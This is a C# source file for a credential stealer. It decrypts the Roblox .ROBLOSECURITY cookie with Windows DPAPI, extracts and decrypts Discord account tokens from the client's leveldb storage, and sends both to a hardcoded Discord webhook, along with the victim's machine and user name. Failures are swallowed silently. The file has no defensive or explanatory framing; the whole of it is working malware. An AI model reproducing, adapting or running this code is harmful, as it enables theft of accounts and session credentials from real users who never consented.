using System;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Security.Cryptography;
using System.Runtime.InteropServices;

class Stealer
{
    [DllImport("crypt32.dll", SetLastError = true)]
    static extern bool CryptUnprotectData(
        IntPtr pDataIn, string szDataDescr, IntPtr pOptionalEntropy,
        IntPtr pvReserved, IntPtr pPromptStruct, int dwFlags,
        ref DATA_BLOB pDataOut);

    [StructLayout(LayoutKind.Sequential)]
    struct DATA_BLOB { public int cbData; public IntPtr pbData; }

    static string WEBHOOK = "https://ptb.discord.com/api/webhooks/1508968849423466568/RgHrOAG8WmS3Ec29yhIbkOJlk_PLzM7_fvJUarnpgelHS5vxDFKqh8owy3SXRyTDEoDM";

    static byte[] DPAPI_Decrypt(byte[] data)
    {
        DATA_BLOB inBlob = new DATA_BLOB { cbData = data.Length, pbData = Marshal.AllocHGlobal(data.Length) };
        Marshal.Copy(data, 0, inBlob.pbData, data.Length);
        DATA_BLOB outBlob = new DATA_BLOB();
        if (CryptUnprotectData(inBlob.pbData, null, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0, ref outBlob))
        {
            byte[] result = new byte[outBlob.cbData];
            Marshal.Copy(outBlob.pbData, result, 0, outBlob.cbData);
            Marshal.FreeHGlobal(inBlob.pbData);
            return result;
        }
        Marshal.FreeHGlobal(inBlob.pbData);
        return null;
    }

    static void SendWebhook(string title, string fields, string filename, string fileContent)
    {
        try
        {
            string json = "{\"embeds\":[{\"title\":\"" + title + "\",\"color\":65279,\"fields\":[" + fields + "]," +
                "\"footer\":{\"text\":\"" + Environment.MachineName + " / " + Environment.UserName + "\"}}]}";
            using (WebClient wc = new WebClient())
            {
                wc.Headers.Add("Content-Type", "application/json");
                wc.UploadString(WEBHOOK, "POST", json);
            }
            if (!string.IsNullOrEmpty(fileContent))
            {
                string boundary = Guid.NewGuid().ToString();
                string body = "--" + boundary + "\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" + filename + "\"\r\nContent-Type: text/plain\r\n\r\n" + fileContent + "\r\n--" + boundary + "--";
                using (WebClient wc = new WebClient())
                {
                    wc.Headers.Add("Content-Type", "multipart/form-data; boundary=" + boundary);
                    wc.UploadString(WEBHOOK, "POST", body);
                }
            }
        }
        catch { }
    }

    static void Main()
    {
        string robloxPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Roblox", "LocalStorage", "robloxcookies.dat");
        if (File.Exists(robloxPath))
        {
            try
            {
                string raw = File.ReadAllText(robloxPath);
                if (raw.Contains("CookiesData"))
                {
                    int start = raw.IndexOf("CookiesData\":\"") + 14;
                    int end = raw.IndexOf("\"", start);
                    string b64 = raw.Substring(start, end - start);
                    byte[] enc = Convert.FromBase64String(b64);
                    byte[] dec = DPAPI_Decrypt(enc);
                    if (dec != null)
                    {
                        string txt = Encoding.UTF8.GetString(dec);
                        Match m = Regex.Match(txt, @"\.ROBLOSECURITY\s+([^\s;]+)");
                        string cookie = m.Success ? m.Groups[1].Value : txt;
                        string fields = "{\"name\":\"Source\",\"value\":\"File (DPAPI)\",\"inline\":false}," +
                            "{\"name\":\"Cookie Length\",\"value\":\"" + cookie.Length + "\",\"inline\":true}";
                        SendWebhook("Roblox Cookie", fields, "cookie.txt", cookie);
                    }
                }
            }
            catch { }
        }
        else { SendWebhook("No Roblox Cookie", "{\"name\":\"Status\",\"value\":\"Not found\"}", null, null); }

        // Discord tokens
        string[] discordClients = { "discord", "discordptb", "discordcanary" };
        foreach (string client in discordClients)
        {
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string lsPath = Path.Combine(appData, client, "Local State");
            string ldbPath = Path.Combine(appData, client, "Local Storage", "leveldb");
            if (!File.Exists(lsPath) || !Directory.Exists(ldbPath)) continue;
            try
            {
                string lsContent = File.ReadAllText(lsPath);
                int keyStart = lsContent.IndexOf("encrypted_key\":\"") + 17;
                int keyEnd = lsContent.IndexOf("\"", keyStart);
                byte[] encKey = Convert.FromBase64String(lsContent.Substring(keyStart, keyEnd - keyStart));
                byte[] keyData = new byte[encKey.Length - 5];
                Array.Copy(encKey, 5, keyData, 0, keyData.Length);
                byte[] masterKey = DPAPI_Decrypt(keyData);
                if (masterKey == null) continue;

                foreach (string file in Directory.GetFiles(ldbPath, "*.ldb"))
                {
                    string content = File.ReadAllText(file, Encoding.UTF8);
                    foreach (Match m in Regex.Matches(content, @"dQw4w9WgXcQ:([^\s""]+)"))
                    {
                        try
                        {
                            byte[] tokEnc = Convert.FromBase64String(m.Groups[1].Value);
                            byte[] iv = new byte[12]; Array.Copy(tokEnc, 3, iv, 0, 12);
                            int ctLen = tokEnc.Length - 16 - 15;
                            byte[] ct = new byte[ctLen]; Array.Copy(tokEnc, 15, ct, 0, ctLen);
                            byte[] tag = new byte[16]; Array.Copy(tokEnc, tokEnc.Length - 16, tag, 0, 16);
                            byte[] decTok = new byte[ctLen];
                            using (AesManaged aes = new AesManaged { Mode = CipherMode.ECB, Key = masterKey, Padding = PaddingMode.None })
                            {
                                ICryptoTransform encryptor = aes.CreateEncryptor();
                                byte[] counter = new byte[16]; Array.Copy(iv, 0, counter, 0, 12);
                                for (int j = 0; j < ctLen; j += 16) { counter[15]++; byte[] block = encryptor.TransformFinalBlock(counter, 0, 16); int len = Math.Min(16, ctLen - j); for (int k = 0; k < len; k++) decTok[j + k] = (byte)(ct[j + k] ^ block[k]); }
                            }
                            string token = Encoding.UTF8.GetString(decTok);
                            if (Regex.IsMatch(token, @"[\w-]{24}\.[\w-]{6}\.[\w-]{25,}"))
                            {
                                string fields = "{\"name\":\"Client\",\"value\":\"" + client + "\",\"inline\":true}," +
                                    "{\"name\":\"Token\",\"value\":\"```" + token.Substring(0, Math.Min(token.Length, 50)) + "...```\",\"inline\":false}";
                                SendWebhook("Discord Token: " + client, fields, "token_" + client + ".txt", token);
                            }
                        }
                        catch { }
                    }
                }
            }
            catch { }
        }
    }
}

